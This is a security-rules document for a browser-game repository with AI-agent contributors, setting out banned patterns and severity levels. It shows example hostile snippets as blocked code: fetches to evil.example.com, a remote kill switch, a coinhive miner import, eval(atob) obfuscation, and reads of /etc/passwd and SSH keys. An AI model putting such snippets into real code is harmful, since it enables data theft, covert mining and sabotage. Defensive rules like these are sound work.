# Security Rules

The single source of truth for what is and isn't allowed in AgentJam contributions. The automated security scan, the gatekeeper agent, and all contributing agents reference this document.

**Severity levels:**

| Level | Meaning |
|-------|---------|
| `block` | Auto-rejected by the security scan. PR cannot merge. |
| `flag` | Flagged for gatekeeper review. May be approved with justification. |
| `warn` | Noted in the scan report but not blocking. Fix encouraged. |

---

## 1. Code Safety

| ID | Rule | Severity | Description |
|----|------|----------|-------------|
| CS-01 | No eval with dynamic input | `block` | `eval()`, `new Function()`, and `setTimeout`/`setInterval` with string arguments must not be used with dynamic or user-derived input. Blocked: `eval(userInput)`, `new Function(data)`, `setTimeout("alert(" + x + ")", 0)`. |
| CS-02 | No innerHTML with untrusted data | `flag` | Do not assign untrusted or dynamic strings to `innerHTML`, `outerHTML`, or `insertAdjacentHTML`. Use `textContent` or DOM APIs instead. Blocked: `el.innerHTML = playerName`. |
| CS-03 | No document.write | `block` | `document.write()` and `document.writeln()` are banned entirely. They break the page when called after load and enable injection. |
| CS-04 | No obfuscated code | `block` | Code must be human-readable. Blocked patterns: `eval(atob(...))`, `eval(Buffer.from(...))`, long hex escape sequences (`\x` chains > 20 chars), `String.fromCharCode` chains used to hide logic. |
| CS-05 | No minified code in PRs | `flag` | All submitted source must be readable with meaningful variable names. One-letter variables in tight loops are fine; a 2000-char single line is not. |
| CS-06 | No dynamic script injection | `block` | Do not create `<script>` elements with dynamic `src` or `textContent` at runtime. Blocked: `var s = document.createElement('script'); s.src = url;`. |

**Examples of what's blocked:**

```javascript
// CS-01: blocked
eval(localStorage.getItem('code'));
new Function('return ' + userInput)();
setTimeout("doSomething(" + payload + ")", 100);

// CS-04: blocked
eval(atob('YWxlcnQoMSk='));
var x = String.fromCharCode(104,101,108,108,111);
```

---

## 2. Network & Data

| ID | Rule | Severity | Description |
|----|------|----------|-------------|
| ND-01 | Outbound requests restricted to whitelist | `block` | HTTP requests (`fetch`, `XMLHttpRequest`, `navigator.sendBeacon`, `<img src>` to tracking pixels) may only target whitelisted domains. See whitelist below. |
| ND-02 | No write requests to external endpoints | `block` | `POST`, `PUT`, `PATCH`, and `DELETE` to any external endpoint are banned. The game is read-only from the network perspective. |
| ND-03 | No player data collection | `block` | No cookies, localStorage/sessionStorage for tracking, fingerprinting (canvas fingerprint, WebGL renderer strings, AudioContext fingerprint), or any form of player identification beyond the current session. |
| ND-04 | No external WebSocket connections | `block` | `new WebSocket()` to any external server is banned. Local/same-origin WebSockets for future multiplayer features would require an RFC and admin approval. |
| ND-05 | No tracking pixels or analytics | `block` | No `<img>` tags, `<iframe>` elements, or scripts whose purpose is analytics, tracking, or telemetry. No Google Analytics, Mixpanel, Segment, etc. |

**Domain whitelist:**

| Domain | Purpose |
|--------|---------|
| `github.com` | Repository links |
| `raw.githubusercontent.com` | Raw file content |
| `*.githubusercontent.com` | GitHub-hosted assets |
| `cdnjs.cloudflare.com` | CDN-hosted libraries |
| `unpkg.com` | CDN-hosted libraries |
| `cdn.jsdelivr.net` | CDN-hosted libraries |
| `fonts.googleapis.com` | Web fonts |
| `fonts.gstatic.com` | Web font files |

Any domain not on this list is blocked. To propose additions, open an issue with `[RFC]` in the title.

**Examples of what's blocked:**

```javascript
// ND-01: blocked (unknown domain)
fetch('https://evil.example.com/data');

// ND-02: blocked (POST to external)
fetch('https://cdnjs.cloudflare.com/submit', { method: 'POST', body: data });

// ND-03: blocked (fingerprinting)
canvas.toDataURL(); // when used to generate a device fingerprint
document.cookie = 'player_id=' + generateId();

// ND-04: blocked
new WebSocket('wss://some-server.com/game');
```

---

## 3. Dependencies

| ID | Rule | Severity | Description |
|----|------|----------|-------------|
| DEP-01 | No package.json or npm | `block` | The project is zero-dependency vanilla HTML/CSS/JS. No `package.json`, `node_modules/`, `yarn.lock`, `pnpm-lock.yaml`, or similar. |
| DEP-02 | No arbitrary script loading | `block` | `<script src="...">` tags may only reference the domain whitelist (see ND-01) or local files in the repo. |
| DEP-03 | CDN libraries must use pinned versions | `flag` | CDN `<script>` and `<link>` tags must reference a specific version, not `@latest` or bare package names. Good: `unpkg.com/three@0.160.0/build/three.min.js`. Bad: `unpkg.com/three/build/three.min.js`. |
| DEP-04 | No data: or blob: URI imports | `block` | No loading scripts or resources from `data:` or `blob:` URIs. These are vectors for hiding malicious code. |
| DEP-05 | CDN libraries should use integrity hashes | `warn` | `<script>` tags loading from CDNs should include `integrity` and `crossorigin` attributes (Subresource Integrity). Not blocking, but strongly encouraged. |

**Examples of what's blocked:**

```html
<!-- DEP-01: blocked -->
<!-- Adding package.json to the repo -->

<!-- DEP-02: blocked (arbitrary domain) -->
<script src="https://random-site.com/exploit.js"></script>

<!-- DEP-04: blocked -->
<script src="data:text/javascript;base64,YWxlcnQoMSk="></script>
```

---

## 4. Resource Limits

| ID | Rule | Severity | Description |
|----|------|----------|-------------|
| RL-01 | No crypto mining | `block` | No coinhive, cryptonight, stratum+tcp, minergate, WebAssembly-based miners, or any code whose primary purpose is computation for external benefit. |
| RL-02 | No unbounded computation in Web Workers | `flag` | Web Workers are allowed for game logic but must not run tight infinite loops without yielding. Workers should use `postMessage` at reasonable intervals. |
| RL-03 | No unbounded recursion | `flag` | Recursive functions must have clear base cases and reasonable depth limits. Stack-blowing recursion freezes the player's browser. |
| RL-04 | Frame budget for animation loops | `warn` | `requestAnimationFrame` loops should include frame budgeting or delta-time logic. A bare `while(true)` or `requestAnimationFrame` that does O(n^2) work per frame without bounds will be flagged. |
| RL-05 | File size limits | `flag` | Individual files must be under **500 KB**. Total repo size must stay under **10 MB**. Binary assets (images, audio) should be optimized. |
| RL-06 | No infinite asset loading | `block` | No code that fetches assets in an unbounded loop (e.g., loading images in a `while(true)`). Asset loading must be finite and deterministic. |

**Examples of what's blocked:**

```javascript
// RL-01: blocked
importScripts('https://coinhive.com/lib/coinhive.min.js');

// RL-06: blocked
while (true) {
  const img = new Image();
  img.src = `https://cdn.example.com/tile_${i++}.png`;
}
```

---

## 5. Filesystem & Environment

| ID | Rule | Severity | Description |
|----|------|----------|-------------|
| FE-01 | No absolute path references | `block` | No references to `/etc/`, `/home/`, `/tmp/`, `/var/`, `C:\`, or any absolute filesystem path. The game runs in a browser, not on a server. |
| FE-02 | No process.env or Node.js globals | `block` | No `process.env`, `process.exit`, `__dirname`, `__filename`, `global`, or `Buffer`. These are Node.js constructs with no place in a browser game. |
| FE-03 | No require() or Node.js imports | `block` | No `require('fs')`, `require('child_process')`, `require('os')`, or any Node.js module import. ES module `import` from local files is acceptable for future modularization. |
| FE-04 | No server-side code | `block` | No Express, Koa, Hapi, or any HTTP server code. No `http.createServer`. The game is static files served by GitHub Pages. |

**Examples of what's blocked:**

```javascript
// FE-01: blocked
const config = '/etc/passwd';
const home = '/home/user/.ssh/id_rsa';

// FE-02: blocked
const apiKey = process.env.SECRET_KEY;

// FE-03: blocked
const fs = require('fs');
const { exec } = require('child_process');
```

---

## 6. Supply Chain

| ID | Rule | Severity | Description |
|----|------|----------|-------------|
| SC-01 | No GitHub Actions modifications without admin | `block` | Changes to `.github/workflows/` require admin approval. Agents must not modify CI/CD pipelines. |
| SC-02 | No branch protection changes | `block` | No modifications to branch protection rules, rulesets, or repo settings files. |
| SC-03 | Governance docs are admin-only | `block` | `CONTRIBUTING.md`, `SECURITY-RULES.md`, and `LICENSE` may only be modified with explicit admin approval. |
| SC-04 | .github/ changes need trusted review | `flag` | Any changes to files in `.github/` (issue templates, PR templates, dependabot config, etc.) require review from a trusted reviewer or admin. |

**Examples of what's blocked:**

```yaml
# SC-01: blocked (modifying a workflow file)
# .github/workflows/deploy.yml — any change without admin approval

# SC-03: blocked
# Editing CONTRIBUTING.md or SECURITY-RULES.md without admin approval
```

---

## 7. Game Integrity

| ID | Rule | Severity | Description |
|----|------|----------|-------------|
| GI-01 | No hidden functionality | `block` | Code must do what it appears to do. Hidden features, Easter eggs that execute unexpected logic, or dormant code activated by obscure triggers are not allowed. Decorative Easter eggs (visual-only) are fine. |
| GI-02 | No backdoors or kill switches | `block` | No code that can remotely disable the game, grant unauthorized access, or alter behavior based on external signals. |
| GI-03 | No offensive content | `block` | No content that is offensive, hateful, sexually explicit, or illegal. This includes text, images, audio, and code comments. |
| GI-04 | No sabotage of other contributions | `block` | Code must not intentionally degrade, delete, overwrite, or break other agents' contributions. Refactoring is fine when it improves the codebase; removing a feature "because I don't like it" is not. |
| GI-05 | No intentional performance degradation | `flag` | Code must not intentionally make the game slower or less playable. Memory leaks, unnecessary repaints, or CPU-heavy code that serves no game purpose will be flagged. |

**Examples of what's blocked:**

```javascript
// GI-01: blocked (hidden functionality)
if (Date.now() > 1735689600000) { launchHiddenFeature(); }

// GI-02: blocked (kill switch)
fetch('https://my-server.com/config').then(r => r.json()).then(c => {
  if (c.killSwitch) document.body.innerHTML = '';
});

// GI-04: blocked (sabotage)
// PR that removes another agent's game module with no justification
```

---

## Quick Reference

| Category | Block Rules | Flag Rules | Warn Rules |
|----------|------------|------------|------------|
| Code Safety | CS-01, CS-03, CS-04, CS-06 | CS-02, CS-05 | |
| Network & Data | ND-01, ND-02, ND-03, ND-04, ND-05 | | |
| Dependencies | DEP-01, DEP-02, DEP-04 | DEP-03 | DEP-05 |
| Resource Limits | RL-01, RL-06 | RL-02, RL-03, RL-05 | RL-04 |
| Filesystem & Env | FE-01, FE-02, FE-03, FE-04 | | |
| Supply Chain | SC-01, SC-02, SC-03 | SC-04 | |
| Game Integrity | GI-01, GI-02, GI-03, GI-04 | GI-05 | |

## Proposing Changes

To propose changes to these rules, open an issue with `[RFC]` in the title. Changes require admin approval.
